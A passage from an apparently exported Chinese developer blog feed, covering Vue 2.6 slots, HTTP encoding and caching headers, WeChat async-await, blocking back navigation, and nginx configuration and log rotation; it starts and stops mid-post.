slot 语法并且英语过关，我们建议你完整地阅读 RFC 来更好地理解新语法为什么这样设计。如果你对于 slot 并不熟悉，那么建议你直接看更新过的文档（或是等勾股更新中文翻译）。 下面的例子是个人比较喜欢的一种方式（个人看法） 1234567891011121314 &lt;my-component&gt; &lt;template #header&gt; &lt;p&gt;Header&lt;/p&gt; &lt;/template&gt; &lt;template #default="&#123; data &#125;"&gt; &lt;h2&gt;&#123;&#123; data.title &#125;&#125;&lt;/h2&gt; &lt;p&gt;&#123;&#123; data.text &#125;&#125;&lt;/p&gt; &lt;/template&gt; &lt;template #footer&gt; &lt;p&gt;Footer&lt;/p&gt; &lt;/template&gt;&lt;/my-component&gt; 性能优化 在 3.0 中我们希望实现的另一个关于 slot 的改进就是统一 slot 和 scoped slot 的内部实现，从而获得更好的性能优化。普通的 slot 是在父组件的渲染函数中被生成的，因此当一个普通的 slot 所依赖的数据发生变化时，首先触发的是父组件的更新，然后新的 slot 内容被传到子组件，触发子组件更新。相比之下，scoped slot 在编译时生成的是一个函数，这个函数被传入子组件之后会在子组件的渲染函数中被调用。这意味着 scoped slot 的依赖会被子组件收集，那么当依赖变动时就只会直接触发子组件更新了。2.6 中我们又引入了另一个优化：如果子组件只使用了 scoped slot，那么父组件自身依赖变动时，不会再强制子组件更新。这个优化使得父子组件之间的依赖即使在存在 slot 的情况下依然完全解耦，从而保证最优的整体更新效率。（对比之下 React 使用 render props 时绝大部分情况下都会触发父子组件一起更新） 除此之外： 所有使用新的 v-slot 语法的 slot 都会被编译为 scoped slot。这意味着所有使用新语法的 slot 代码都会获得上述的性能优化； 所有的非 scoped slot 现在也被以函数的形式暴露在 this.$scopedSlots 上。如果你是直接用 render 函数的用户，你现在可以完全抛弃 this.$slots 而全部用 this.$scopedSlots 来处理所有的 slots 了。（3.0 中 this.$slots 将会直接暴露函数，取代 this.$scopedSlots) 3.0 中将不再有普通 slot 和 scoped slot 的区分——所有的 slot 都使用统一的语法，使用统一的内部实现，获得同样的性能优化。 异步错误处理 Vue 的内置错误处理机制（组件中的 errorCaptured 钩子和全局的 errorHandler 配置项）现在也会处理 v-on 侦听函数中抛出的错误了。另外，如果你组件的生命周期钩子或是实践侦听函数中有异步操作，那么可以通过返回一个 Promise 的方式来让 Vue 处理可能存在的异步错误。如果你用了 async/await，那么就更简单了，因为 async 函数默认返回 Promise： 1234567 export default &#123; async mounted() &#123; // 这里抛出的异步错误会被 errorCaptured 或是 // Vue.config.errorHandler 钩子捕获到 this.posts = await api.getPosts() &#125;&#125; 动态指令参数 指令的参数现在可以接受动态的 JavaScript 表达式： 1234567891011 &lt;div v-bind:[attr]="value"&gt;&lt;/div&gt;&lt;div :[attr]="value"&gt;&lt;/div&gt;&lt;button v-on:[event]="handler"&gt;&lt;/button&gt;&lt;button @[event]="handler"&gt;&lt;/button&gt;&lt;my-component&gt; &lt;template v-slot:[slotName]&gt; Dynamic slot name &lt;/template&gt;&lt;/my-component&gt; 更多细节参见 RFC。该语法一个方便的特性是如果表达式的值是 null 则绑定/侦听器会被移除。 组件库的作者需要注意：该语法需要 2.6 以上版本的 runtime 的配合。如果你发布的是预编译过的组件，并且想要保持跟 2.6 之前版本的兼容，不要使用此功能。 编译警告位置信息 2.6 开始，所有的编译器警告都包含了源码位置信息。这使得我们可以生成更有用的警告信息： 显式创建响应式对象 2.6 引入了一个新的全局 API，可以用来显式地创建响应式对象： 123 const reactiveState = Vue.observable(&#123; count: 0&#125;) 生成的对象可以直接用在计算属性 (computed property) 和 render 函数中，并会在被改动时触发相应的更新。 SSR 数据预抓取 新的 serverPrefetch 钩子 使得任意组件都可以在服务端渲染时请求异步的数据（不再限制于路由组件）。这使得整体的数据预抓取方案可以更为灵活，并且可以和路由解耦。Nuxt 和 vue-apollo 等项目已经计划使用此特性来简化其内部实现以及提供新的能力。 可直接在浏览器中引入的 ES Modules 构建文件 Vue 之前版本的 ES Modules 构建文件是针对打包工具的，因此里面包含了一些需要在构建时替换掉的环境变量，从而导致无法直接在浏览器中使用。2.6 包含了一个可以直接在浏览器导入的版本： 1234567 &lt;script type="module"&gt;import Vue from 'https://unpkg.com/vue/dist/vue.esm.browser.js' new Vue(&#123; // ...&#125;)&lt;/script&gt; 重要的内部改动 nextTick 重新调整为全部使用 Microtask 在 2.5 当中我们引入了一个改动，使得当一个 v-on DOM 事件侦听器触发更新时，会使用 Macrotask 而不是 Microtask 来进行异步缓冲。这原本是为了修正一类浏览器的特殊边际情况导致的 bug 才引入的，但这个改动本身却导致了更多其它的问题。在 2.6 里面我们对于原本的边际情况找到了更简单的 fix，因此这个 Macrotask 的改动也就没有必要了。现在 nextTick 将会统一全部使用 Microtask。如果你对具体的细节感兴趣，可以看这里。 this.$scopedSlots 函数统一返回数组 （此改动只影响使用 render 函数的用户）在 render 函数中，传入的 scoped slot 以函数的形式被暴露在 this.$scopedSlots 上面。在之前的版本中，这些函数会基于父组件传入的内容不同而返回单个 VNode 或是一个 VNode 的数组。这是当初实现时的一个疏漏，导致了 scoped slot 函数的返回值类型是不确定的。2.6 当中，所有的 scoped slot 函数都只会返回 VNode 数组或是 undefined。如果你的现有代码中使用了 this.$scopedSlots 并且没有处理可能返回数组的情况，那么可能会需要进行相应的修正。更多细节参见这里。 个人在实际使用中的差别与亮点 因为个人原因，有些功能之前是没使用到的，这里提出使用用法，方便记忆。 slot 默认显示在2.6之前是没有默认值的，需要使用v-if进行判断（好久之前的事情，因为当初使用的v-if，所以这样说），现在可把v-if中的内容使用&lt;slot&gt;...&lt;/slot&gt;包裹起来。 替换所有$slots$slots 在当前版本是一个废弃的api但仍可以使用，为了与文档接口，可以使用$scopedSlots进行替换。 $scopedSlots 返回的是一个方法 在2.6版本之前获取插槽内容的dom节点可以这样 this.$slots.menu[0].elm； 需要这样使用const vnode = this.$scopedSlots.menu()[0]，因为this.$scopedSlots.menu返回的是一个方法，而且要在render函数中使用且只能使用一次并返回vnode， $scopedSlots 绑定事件 上面使用dom节点是为了添加事件，可以直接在 vnode.on 对象中添加事件 参考 https://cn.vuejs.org/v2/api/#vm-scopedSlotshttps://cn.vuejs.org/v2/guide/components-slots.htmlhttps://zhuanlan.zhihu.com/p/56260917 https://github.com/Akryum/vue-virtual-scroller]]></content>
      <categories>
        <category>Vue</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Transfer-Encoding、Content-Length、Content-Encoding、Accept-Encoding]]></title>
    <url>%2Fblob%2F2019-07-11-transfer-encoding%2C-content-length%2C-content-encoding%2C-accept-encoding%2F</url>
    <content type="text"><![CDATA[概述 我们在日常进行HTTP请求的时候，会遇到请求头或者响应头中有Transfer-Encoding、Content-Length、Content-Encoding、Accept-Encoding这几个，难免会不知道各自的含义及使用场景，也可能会搞混，我们今天就简单的捋一下这几个Header。 keep-alive 在讲解上面几个头之前，我们必须先了解一下Persistent Connection（持久连接或者长连接），HTTP持久连接这个机制，很大程度上提高了HTTP的性能，我们看下在引入持久连接之前，HTTP连接是什么样子： 先进行TCP握手，然后进行数据传输，完成数据传输之后，释放连接。当网络内容复杂时候，会出现多次数据传输，那么就会造成多次频繁的创建Socket和释放，频繁的握手，就会出现延时，这个问题在引入持久连接得以解决。 通过设置设置 Connection头部为keep-alive实现持久连接： keepalive connections机制可以在数据传输完成之后仍然保持TCP连接，以备后用，当用户需要再次获取数据时，直接使用刚刚空闲下来的连接，无需再次握手，这样就解决了延时问题，提高了HTTP的性能。持久连接是HTTP1.0后来才引进的，到了HTTP1.1规定所有连接都必须是持久的，在Header上添加了Connection为close。在现代浏览器中，一般同时开启6～8个keepalive connections的socket连接，并保持一定的链路生命，当不需要时再关闭；而在服务器中，一般是由软件根据负载情况进行配置。 主要内容 Content-Length 我们通过给HTTP请求添加Content-Length头部表示请求体的实际长度，也可以由服务器端添加Content-Length返回给客户端，表示响应体内容的实际长度。在实际应用中，Content-Length有时候不好获取，比如实体来自于网络文件或者是有数据库动态产生的，就很难获取它的准确长度。这时候倒是可以开一个足够大的buffer，等内容全部生成完毕在准确计算buffer的总长度，然而这样会导致内存消耗太大，也会让客户端等待时间过长。 当HTTP请求时短连接的时候，数据传输完成会根据连接是否关闭判断请求体或者响应体的边界，所以不需要标明请求体或者响应体的实际长度，请求就可以顺利完成；而当HTTP为长连接的时候，很显然不可以，必须要拥有判断请求或者响应体的边界，才能完成网络请求，如果Content-Length的值小于实际长度，则数据将会被截断，如果Content-Length的值大于实际长度则会导致网络请求处于停滞状态；如果没有Content-Length或者其他可以判定实体边界，则网络请求还是会被停滞。 Transfer-Encoding 使用Transfer-Encoding可以解决我们上面所提到的问题，Transfer-Encoding可以代替Content-Length。Transfer-Encoding表示传输编码，之前文当中给它定义了gzip/compress/deflate/identity/chunked等几种不区分大小写的多种取值，在最新的文档中传输编码之定义了一种编码值：chunked（分块编码）。当我们给请求或者响应的头部添加了Transfer-Encoding:chunked的时候，表示实体在传输的过程中采用的是分块编码的方式，实体被改为一系列的分块，每一个部分分块上面都有数据内容和长度，当分块内容为空长度为0时，意味着实体的边界，数据传输结束。所以，在HTTP网络请求中，如果无法确定实体的Content-Length的大小或者没有添加Content-Length作为头部信息的一部分，会导致网络请求发生问题，此时添加头Transfer-Encoding:chunked（分块编码）可以解决长度问题。 Accept-Encoding和Content-Encoding Accept-Encoding添加在请求头中，向服务器端表明客户端支持的编码格式，Content-Encoding存在于响应头中，由服务器端返回，表示响应体内容的编码格式，常见的编码格式有gzip/compress/deflate/identity。可以结合Transfer-Encoding使用。 举例说明 再一次HTTP长连接中，无法判断请求体的长度和响应体的长度，我们就会做如下的流程： 客户端将请求内容加入到请求体中，添加请求头Transfer-Encoding:chunked表明分块编码，同时添加Accept-Encoding:gzip表明客户端支持gzip的编码格式； 服务器端接收到客户端的网络请求，根据客户端传来的Transfer-Encoding:chunked可知请求体位分块编码，紧接着开始接收请求体数据，当接收到的分块的内容为空长度为0时，说明到了请求体的边界，服务器端完成了数据接收。 经过一系列的操作，服务器端完了业务处理，给客户端返回数据，由于要返回的数据长度无法获取到，所以服务器端在返回数据中添加了头Transfer-Encoding:chunked表明分块编码，然后将每一块数据内容采用gzip进行编码，同时添加Content-Encoding:gzip表明服务器对返回的数据采用了gzip编码。 客户端收到服务器端的响应，因为响应头包含了Transfer-Encoding:chunked，所以一直到响应数据的分块长度为0内容为空，才算是数据传输完成，此时客户端会解析服务端发来的Content-Encoding:gzip，并且采用gzip方法解码数据，完成一次数据请求。 参考 https://blog.csdn.net/qq_29405933/article/details/84247999]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>Transfer-Encoding</tag>
        <tag>Content-Length</tag>
        <tag>Content-Encoding</tag>
        <tag>Accept-Encoding</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vary与内容协商]]></title>
    <url>%2Fblob%2F2019-07-03-vary-and-content-negotiation%2F</url>
    <content type="text"><![CDATA[Vary 是一个HTTP响应头部信息，它决定了对于未来的一个请求头，应该用一个缓存的回复(response)还是向源服务器请求一个新的回复。它被服务器用来表明在 content negotiationalgorithm（内容协商算法）中选择一个资源代表的时候应该使用哪些头部信息（headers）. 在响应状态码为 304 Not Modified 的响应中，也要设置 Vary 首部，而且要与相应的 200OK 响应设置得一模一样。 语法 12 Vary: *Vary: &lt;header-name&gt;, &lt;header-name&gt;, ... * 所有的请求都被视为唯一并且非缓存的，使用Cache-Control: private,来实现则更适用，这样用于说明不存储该对象更加清晰。 逗号分隔的一系列http头部名称，用于确定缓存是否可用。 ##内容协商 在 HTTP 协议中，内容协商是这样一种机制，通过为同一 URI 指向的资源提供不同的展现形式，可以使用户代理选择与用户需求相适应的最佳匹配 最佳展现形式的选取可以通过两种机制实现： 客户端设置特定的 HTTP 首部 （又称为服务端驱动型内容协商机制或者主动协商机制）；这是进行内容协商的标准方式； 服务器返回 300 (Multiple Choices) 或者 406 (Not Acceptable) HTTP 状态码 （又称为代理驱动型协商机制或者响应式协商机制）；这种方式一般用作备选方案。 服务端驱动型内容协商机制 HTTP/1.1 规范指定了一系列的标准消息头用于启动服务端驱动型内容协商 （Accept、Accept-Charset、 Accept-Encoding、Accept-Language）。尽管严格来说 User-Agent并不在此列，有时候它还是会被用来确定给客户端发送的所请求资源的特定展现形式。服务器会使用 Vary 消息头来说明实际上哪些消息头被用作内容协商的参考依据。 请求头字段 说明 响应头字段 Accept 告知服务器发送何种媒体类型 Content-Type Accept-Language 告知服务器发送何种语言 Content-Language Accept-Charset 告知服务器发送何种字符集 Content-Type Accept-Encoding 告知服务器采用何种压缩方式 Content-Encoding User-Agent 告知服务器发送请求的浏览器，这是不容易的，请参考使用用户代理字段进行浏览器检测 服务端驱动型内容协商机制由于一些缺点而为人诟病——它在规模化方面存在问题。在协商机制中，每一个特性需要对应一个首部。如果想要使用屏幕大小、分辨率或者其他方面的特性，就需要创建一个新的首部。而且在每一次请求中都必须发送这些首部。在首部很少的时候，这并不是问题，但是随着数量的增多，消息体的体积会导致性能的下降。带有精确信息的首部发送的越多，信息熵就会越大，也就准许了更多 HTTP 指纹识别行为，以及与此相关的隐私问题的发生。 Nginx 对于 Nginx 来说，下面这个配置可以自动给启用了 gzip 的响应加上 Vary: Accept-Encoding： 1 gzip_vary on; IE 为了确保IE6～8不至于客户端cache完全失效，可用 Vary: User-Agent, Accept-Encoding 并开启压缩。 对于IE6，在解压后整个Vary头被丢弃，就OK。对于IE7和8，解压后AE被去掉，剩下的UA则会被忽略。 IE下的具体问题可以查看 IE与Vary头 和 Vary with Care 代理驱动型内容协商机制 从 HTTP 协议制定之初，该协议就准许另外一种协商机制：代理驱动型内容协商机制，或称为响应式协商机制。在这种协商机制中，当面临不明确的请求时，服务器会返回一个页面，其中包含了可供选择的资源的链接。资源呈现给用户，由用户做出选择。 这种方法主要是通过脚本完成JavaScript 重定向，在检测了协商的条件之后，脚本会触发重定向动作。 参考 Vary https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary内容协商 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiationAccept 默认值 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation/Accept_%E9%BB%98%E8%AE%A4%E5%80%BC使用用户代理字段进行浏览器检测 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Browser_detection_using_the_user_agentHTTP 协议中 Vary 的一些研究 https://www.jianshu.com/p/5c601087c18eIE与Vary头 https://hax.iteye.com/blog/1629953Vary with Care https://blogs.msdn.microsoft.com/ieinternals/2009/06/17/vary-with-care/http请求报文头部vary信息 https://www.cnblogs.com/engeng/articles/5981582.htmlHTTP请求的响应头部Vary的理解 https://blog.csdn.net/qq_29405933/article/details/84315254]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>vary</tag>
        <tag>内容协商</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让微信小程序支持async-await]]></title>
    <url>%2Fblob%2F2019-07-03-let-wechat-applet-support-async-await%2F</url>
    <content type="text"><![CDATA[async-await是ES7的语法，截止我写这篇文章为止，小程序还是不支持async-await语法的，所以需要使用regenerator这个库 在小程序开发工具中如果勾选es6转es5, 会报错： 1 ReferenceError: regeneratorRuntime is not defined 为了避免报错引入regenerator。 引入步骤 在根目录下创建 lib 文件夹，并将 https://github.com/facebook/regenerator/tree/master/packages 里面的 regenerator-runtime 文件夹放进去。 如果出现错误Uncaught TypeError: Function(...) is not a function将runtime.js最后一段try..catch...删掉 使用方法 在需要使用的地方直接进入即可 1 import regeneratorRuntime from '../../utils/regenerator-runtime/runtime'; 当有返回是promise时，可直接使用 async await 处理微信微信小程序原生Api可以使用promise包裹一层，该api可以暴露在app.js中并通过getApp()获取，也可以通过export import来实现。 在需要使用api 的页面中处理如下 123456789101112131415 import regeneratorRuntime from '../../utils/regenerator-runtime/runtime';Page(&#123; async onLoad(options) &#123; console.log('执行删除token--开始') await this.removeStorage('token'); console.log('执行删除token--结束') &#125;, removeStorage(key) &#123; return new Promise((resolve, reject) =&gt; &#123; wx.removeStorage(&#123; key: key, success: resolve, fail: reject &#125;) &#125;) &#125;&#125;) 参考 https://blog.csdn.net/weixin_33755554/article/details/88760981https://www.cnblogs.com/cckui/p/10231801.html]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[禁止页面后退]]></title>
    <url>%2Fblob%2F2019-06-28-forbid-page-back-off%2F</url>
    <content type="text"><![CDATA[在我们前端开发过程中，需要对接第三方公司内容，而且对接方式是通过页面的跳转，最后再跳转到我们前端页面。这样就会出现一个问题，当我们使用后退功能时就会回退到第三方公司页面，或者出现频繁的跳转。 简单方法 假设第三方内容和我们没有跨域可直接使用 location.replace 方法。该方法只是不想让下一个地址回退到当前地址，不是彻底的禁用回退。 复杂方法 如果存在跨域，将会复杂很多，有时候还要根据具体情况具体问题具体分析。但是都是通过 history 来完成的。 1234 history.pushState(null, null, document.URL);window.addEventListener('popstate', function() &#123; history.pushState(null, null, document.URL);&#125;); 这种方法是最好的方法，当然还有其他复杂方法（到上一个页面之后再前进回来、禁用键盘的backspace键），就不做介绍了。 接口重定向 该方法其实是location.replace的高级方法，这个方法不管是否两个地址跨域，都会在回退时不会回退到跳转前的地址。 可以用 node 或者 java 实现该接口。 在Vue中实现 给路由添加meta信息 1 meta: &#123;allowBack: false&#125;, 在全局的router.beforeEach 函数里面获取allowBack的状态，同时更新vuex的allowBack的值 12345678910 let allowBack = true // 给个默认值trueif (to.meta.allowBack !== undefined) &#123; allowBack = to.meta.allowBack&#125;if (!allowBack) &#123; history.pushState(null, null, location.href)&#125; store.dispatch('updateAppSetting', &#123; allowBack: allowBack&#125;) 这段代码得写在next()的后面，因为写在next()前面location.href并不是to的地址 接下来就是最核心的了，在app.vue的mounted里面写onpopstate事件 12345 window.onpopstate = () =&gt; &#123; if (!this.allowBack) &#123; // 这个allowBack 是存在vuex里面的变量 history.go(1) &#125;&#125; 参考 https://blog.csdn.net/LuviaWu/article/details/83893585]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>后退</tag>
        <tag>禁止后退</tag>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[post 请求静态资源]]></title>
    <url>%2Fblob%2F2019-06-25-post-requests-static-resources%2F</url>
    <content type="text"><![CDATA[最近在做银联云闪付扫二维码支付项目，遇到支付成功之后请求成功页面，但是该请求是 post 方式，结果就会返回 405 Not Allowed 。因为一直使用的是nginx，所以也是通过配置nginx解决的。 Nginx 配置 error_page 因为返回的是405状态码，因此可以根据 error_page 控制失败以后的方式。 但是最好做到只给指定页面增加此方法，因为不清楚这种操作所引起的后果。 error_page 要在 rewrite 或者root之后。 方式一 直接转发至当前地址的get方式 12 rewrite ^/h5_lightning/module/icbc /h5_lightning_static/module/icbc.html break;error_page 405 =200 $uri; 方式二 自定义转发方式，相对复杂一点。 123456789 ......error_page 405 =200 @405;......location @405 &#123; proxy_method GET; proxy_pass http://127.0.0.1:80; proxy_set_header Host $host;&#125; 注 这是自己理解并且实践的方式，其他方式可以查看下面的参考链接，或者在评论区留言 参考 Nginx静态资源POST请求返回405状态nginx 设置允许post请求访问静态文件Http 405 错误 Nginx静态资源POST请求返回405状态]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>POST</tag>
        <tag>静态资源</tag>
        <tag>银联云闪付</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 在配置文件中设置日志按年、月、日分割]]></title>
    <url>%2Fblob%2F2019-06-20-nginx-sets-up-log-segmentation-by-year%2C-month-and-day-in-configuration-file%2F</url>
    <content type="text"><![CDATA[使用 timeiso8601 内嵌变量 需要使用到 timeiso8601内嵌变量来获取时间。 time_iso8601 内嵌变量来获取时间。time iso8601内嵌变量来获取时间。time_iso8601格式如下：2018-09-21T16:01:02+02:00。然后使用正则表达式来获取所需时间的数据。 按天分割日志配置在server段： 123456 if ($time_iso8601 ~ "^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)") &#123; set $year $1; set $month $2; set $day $3;&#125;access_log /var/logs/xxxx/access/xxxxx_xx_access_$year-$month-$day.log main; 按小时、分、秒分割： 12345678910 if ($time_iso8601 ~ "^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)T(\d&#123;2&#125;):(\d&#123;2&#125;):(\d&#123;2&#125;)")&#123; set $year $1; set $month $2; set $day $3; set $hour $4; set $minutes $5; set $seconds $6;&#125;access_log /var/logs/xxxx/access/xxxxx_xx_access_$year-$month-$day-$hour-$minutes-$seconds.log main; 在必要的时候可以按小时分割,方便日志分析。 使用Perl语法来捕获 123 if ($time_iso8601 ~ "^(?&lt;year&gt;\d&#123;4&#125;)-(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)") &#123;&#125; access_log /data/logs/nginx/www.ttlsa.com-$year-$month-$day-access.log; 脚本 12345 #!/bin/shd=`date +"%Y%M%d"`mv /var/www/html/ekt/ekt_access.log /var/www/html/ekt/ekt_access1_$d.logkill -USR1 `cat /usr/local/nginx/logs/nginx.pid`echo "done" 在 crontab 添加 1 0 0 * * * root sh /var/www/html/ekt/split.sh 备注：kill -USR1 cat /usr/local/nginx/logs/nginx.pid 用于重新读取日志文件 logrotate 分割 123456789101112 vim /etc/logrotate.d/nginx/var/www/html/ekt/ekt_access.log &#123;dailyrotate 7missingokdateextnotifemptysharedscriptspostrotate [ -e /usr/local/nginx/logs/nginx.pid ] &amp;&amp; kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`endscript&#125; 可以强制执行看下效果 1 logrotate -f /etc/logrotate.d/nginx 以下介绍下参数 123456789101112131415161718192021222324252627282930 compress 通过gzip 压缩转储以后的日志nocompress 不做gzip压缩处理copytruncate 用于还在打开中的日志文件，把当前日志备份并截断；是先拷贝再清空的方式，拷贝和清空之间有一个时间差，可能会丢失部分日志数据。nocopytruncate 备份日志文件不过不截断create mode owner group 轮转时指定创建新文件的属性，如create 0777 nobody nobodynocreate 不建立新的日志文件delaycompress 和compress 一起使用时，转储的日志文件到下一次转储时才压缩nodelaycompress 覆盖 delaycompress 选项，转储同时压缩。missingok 如果日志丢失，不报错继续滚动下一个日志errors address 专储时的错误信息发送到指定的Email 地址ifempty 即使日志文件为空文件也做轮转，这个是logrotate的缺省选项。notifempty 当日志文件为空时，不进行轮转mail address 把转储的日志文件发送到指定的E-mail 地址nomail 转储时不发送日志文件olddir directory 转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统noolddir 转储后的日志文件和当前日志文件放在同一个目录下sharedscripts 运行postrotate脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本prerotate 在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行postrotate 在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行daily 指定转储周期为每天weekly 指定转储周期为每周monthly 指定转储周期为每月rotate count 指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份dateext 使用当期日期作为命名格式dateformat .%s 配合dateext使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合dateext使用，只支持 %Y %m %d %s 这四个参数size(或minsize) log-size 当日志文件到达指定的大小时才转储，log-size能指定bytes(缺省)及KB (sizek)或MB(sizem).当日志文件 &gt;= log-size 的时候就转储。 以下为合法格式：（其他格式的单位大小写没有试过）size = 5 或 size 5 （&gt;= 5 个字节就转储）size = 100k 或 size 100ksize = 100M 或 size 100M 参考 nginx 在配置文件中设置日志按年、月、日分割nginx 直接在配置文章中设置日志分割Nginx 日志分割 运维中的日志切割操作梳理（Logrotate/python/shell脚本实现）]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>日志分割</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解浏览器的缓存机制]]></title>
    <url>%2Fblob%2F2019-06-04-understanding-browser-caching-mechanism%2F</url>
    <content type="text"><![CDATA[本文借助其他同学分享的内容完成。 了解缓存 从前端的角度看缓存我们需要了解的是浏览器缓存，首先我们先了解一下浏览器缓存的使用过程。 一般只有GET请求才会被缓存 第一次发起HTTP请求 先查找浏览器缓存没有，再请求服务器并根据缓存规则缓存。 浏览器存在有效缓存 当我们第二次请求同一个资源，如果存在有效浏览器缓存将不请求服务器直接使用。 浏览器存在无效缓存服务器没过期 当我们过了一段时间再次请求该资源浏览器缓存已经过期，这时就需要带着缓存标识请求服务器，如果服务器没变化就返回304就继续使用。 浏览器存在无效缓存服务器过期 当我们再过了一段时间再次请求该资源浏览器缓存已经过期，这时就需要带着缓存标识请求服务器，这时服务器资源有变化就返回200和新的资源。 看到这里感觉浏览器缓存也挺简单的，但是浏览器缓存真的就是仅仅查看一次吗？还有我盗用其他文章图片上有文字提到的强制缓存，还有没提到的协商缓存，这些都是什么东西，我们怎么去配置，对于我们前端同学来说这些应该是一个需要了解的东西。 看过别人的文章有说强制缓存、协商缓存的，也有说按照位置Service Worker、memory cache、disk cache、网络请求，但无论怎样我都按照自己的想法去梳理浏览器缓存。 在我看来强制缓存就是浏览器缓存，协商缓存是在浏览器缓存过期的情况下根据从服务器获取资源状态决定是否使用浏览器缓存，而浏览器缓存又分为Service Worker、memory cache、disk cache；而初次加载保存浏览器缓存依次从 disk cache、memory cache、Service Worker保存，在使用缓存时则是反序依次去查找。 再来看一个上面内容合并在一起的流程图，注意里面的Age 新增浏览器缓存 浏览器缓存是缓存在客户端上，可以根据资源请求返回的缓存规则自动去缓存，不受开发者控制，也不受 HTTP 协议头的约束，算是一个黑盒。也可以通过Service Worker由开发者编写的额外的脚本，且缓存位置独立，出现也较晚，使用还不算太广泛。 浏览器自动缓存 浏览器缓存是HTTP缓存的一部分，还有代理缓存、网关缓存、CDN、反向代理缓存、负载均衡器等部署在服务器上，为站点和 web 应用提供更好的稳定性、性能和扩展性。 我们设置响应头的某些字段来告诉浏览器哪些资源可以缓存，缓存规则是什么。当前可以设置 Expires 或者 Cache-control。 当浏览器识别当前资源可以缓存时首先保存在磁盘上作为disk cache，然后再保存在内存中作为memory cache。 Expires 这是 HTTP 1.0 的字段，表示缓存到期时间，是一个绝对的时间 (当前时间+缓存时间)，如 1 Expires: Thu, 10 Nov 2017 08:45:11 GMT 在响应消息头中，设置这个字段之后，就可以告诉浏览器，在未过期之前不需要再次请求。 但是，这个字段设置时有两个缺点： 由于是绝对时间，用户可能会将客户端本地的时间进行修改，而导致浏览器判断缓存失效，重新请求该资源。此外，即使不考虑自行修改，时差或者误差等因素也可能造成客户端与服务端的时间不一致，致使缓存失效。 写法太复杂了。表示时间的字符串多个空格，少个字母，都会导致非法属性从而设置失效。 (完整的列表可以查看 MDN) Cache-control 已知 Expires 的缺点之后，在 HTTP/1.1 中，增加了一个字段 Cache-control，该字段表示资源缓存的最大有效时间，在该时间内，客户端不需要向服务器发送请求 这两者的区别就是前者是绝对时间，而后者是相对时间。如下： 1 Cache-control: max-age=2592000 下面列举一些 Cache-control 字段常用的值：(完整的列表可以查看 MDN) max-age：即最大有效时间，在上面的例子中我们可以看到 must-revalidate：如果超过了 max-age 的时间，浏览器必须向服务器发送请求，验证资源是否还有效。 no-cache：虽然字面意思是“不要缓存”，但实际上还是要求客户端缓存内容的，只是是否使用这个内容由后续的对比来决定。 no-store: 真正意义上的“不要缓存”。所有内容都不走缓存，包括强制和对比。 public：所有的内容都可以被缓存 (包括客户端和代理服务器， 如 CDN) private：所有的内容只有客户端才可以缓存，代理服务器不能缓存。默认值。 这些值可以混合使用，例如 Cache-control:public, max-age=2592000。在混合使用时，它们的优先级如下图：(图片来自 https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn) 这里有一个疑问：max-age=0 和 no-cache 等价吗？从规范的字面意思来说，max-age 到期是 应该(SHOULD) 重新验证，而 no-cache 是 必须(MUST) 重新验证。但实际情况以浏览器实现为准，大部分情况他们俩的行为还是一致的。（如果是 max-age=0, must-revalidate 就和 no-cache 等价了） 顺带一提，在 HTTP/1.1 之前，如果想使用 no-cache，通常是使用 Pragma 字段，如 Pragma: no-cache(这也是 Pragma 字段唯一的取值)。但是这个字段只是浏览器约定俗成的实现，并没有确切规范，因此缺乏可靠性。它应该只作为一个兼容字段出现，在当前的网络环境下其实用处已经很小。 总结一下，自从 HTTP/1.1 开始，Expires 逐渐被 Cache-control 取代。Cache-control 是一个相对时间，即使客户端时间发生改变，相对时间也不会随之改变，这样可以保持服务器和客户端的时间一致性。而且 Cache-control 的可配置性比较强大。 Cache-control 的优先级高于 Expires，为了兼容 HTTP/1.0 和 HTTP/1.1，实际项目中两个字段我们都会设置。 disk cache disk cache 也叫 HTTP cache，顾名思义是存储在硬盘上的缓存，因此它是持久存储的，是实际存在于文件系统中的。而且它允许相同的资源在跨会话，甚至跨站点的情况下使用，例如两个站点都使用了同一张图片。 disk cache 会严格根据 HTTP 头信息中的各类字段来判定哪些资源可以缓存，哪些资源不可以缓存；哪些资源是仍然可用的，哪些资源是过时需要重新请求的。当命中缓存之后，浏览器会从硬盘中读取资源，虽然比起从内存中读取慢了一些，但比起网络请求还是快了不少的。绝大部分的缓存都来自 disk cache。 关于 HTTP 的协议头中的缓存字段，我们会在稍后进行详细讨论。 凡是持久性存储都会面临容量增长的问题，disk cache 也不例外。在浏览器自动清理时，会有神秘的算法去把“最老的”或者“最可能过时的”资源删除，因此是一个一个删除的。不过每个浏览器识别“最老的”和“最可能过时的”资源的算法不尽相同，可能也是它们差异性的体现。 访问一个 disk cache 最后会标注为 from disk cache。 memory cache memory cache 